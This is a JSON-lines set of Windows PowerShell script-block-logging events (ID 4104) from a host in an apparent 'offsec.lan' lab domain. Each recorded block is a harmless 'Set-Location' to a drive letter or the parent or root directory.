{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1295,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location B:","ScriptBlockId":"d349dff4-1b33-4f74-a75d-58c338469bee"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1296,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location C:","ScriptBlockId":"bba854a0-def6-46a5-8bb7-1148c2dee707"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1297,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location D:","ScriptBlockId":"337c5921-1256-48f0-aa49-2d99a0c89d42"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1298,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location E:","ScriptBlockId":"5ff5041a-7729-40ba-9360-4a67b66b02be"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1299,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location F:","ScriptBlockId":"c09fb18f-c755-4d29-aa23-59b9e8db6f00"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1300,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location G:","ScriptBlockId":"94499135-462f-4e6c-912c-9c02f1395c91"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1301,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location H:","ScriptBlockId":"fc3de4d3-5288-4949-ae31-20413ae88de4"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1302,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location I:","ScriptBlockId":"8557dd9a-4938-44c8-8c90-1e624d9fe001"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1303,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location J:","ScriptBlockId":"c5a74e47-9a83-459e-ba78-2a186f3f4b89"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1304,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location K:","ScriptBlockId":"eb9be239-a0b7-47d8-9d09-f1fd8e8e308e"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1305,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location L:","ScriptBlockId":"38fc7c20-6e22-4297-9603-711614fea4fb"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1306,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location M:","ScriptBlockId":"96bf0226-b104-4c70-996c-e0cddc8a906d"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1307,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location N:","ScriptBlockId":"f853a427-32a2-477d-86d2-e8d55a29de4b"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1308,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location O:","ScriptBlockId":"34f07b98-3fa7-4c94-b23b-de4d409173dd"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1309,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location P:","ScriptBlockId":"7643c353-2dd8-4588-bd19-068372f4449e"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1310,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location Q:","ScriptBlockId":"bafee791-5f61-478c-b27e-fc6051f02424"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1311,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location R:","ScriptBlockId":"6ae074a7-11e8-4034-94cb-0bca270db926"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1312,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location S:","ScriptBlockId":"bf31dd02-765f-415c-a7be-2928165332ab"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1313,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location T:","ScriptBlockId":"d5101983-d5b5-4a4b-a4c2-1e28c394c17b"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1314,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location U:","ScriptBlockId":"b3436631-814a-4e9a-a9f5-f653e66afbb3"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1315,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location V:","ScriptBlockId":"682fcbda-a369-44b6-964b-f807b55f4783"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1316,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location W:","ScriptBlockId":"506c4b22-1250-4c1e-ba20-04bfe17784e8"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1317,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location X:","ScriptBlockId":"66d0e449-6174-4689-8701-954793f4319c"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1318,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location Y:","ScriptBlockId":"a1df8479-12de-4867-91d2-8adbd07329e8"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1319,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location Z:","ScriptBlockId":"2bea488b-2464-494c-999e-3e03854df0e7"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1320,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location ..","ScriptBlockId":"075b4a15-6529-4d7a-a310-86e866066eff"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1321,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Location \\","ScriptBlockId":"f0d12f4c-3604-42e8-89c0-551e9edd388f"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1322,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"","ScriptBlockId":"0783d7d2-2c3f-405e-b294-070c778241d6"}}}
